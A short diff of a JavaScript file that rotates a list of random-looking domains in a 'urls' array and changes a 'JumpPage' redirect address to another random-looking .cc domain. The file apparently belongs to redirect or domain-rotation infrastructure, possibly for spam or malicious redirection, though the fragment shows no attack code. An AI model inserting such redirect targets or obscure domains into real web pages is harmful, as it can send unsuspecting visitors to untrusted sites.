@@ -37,14 +37,14 @@ var emails = [
 ];
 
 var urls=[]; 
-       urls.push(".zolhlknux.cc");  
+       urls.push(".srwizdhw.com");  
+       urls.push(".zolhlknux.cc");
        urls.push(".tzpwynru.cc");
-       urls.push(".lbgbfyab.cc");
        
           
       
                                                                                  
-var JumpPage="https://uahawnae.com";
+var JumpPage="https://sshlzvpn.cc";
 
 var newestUrls = [];
 
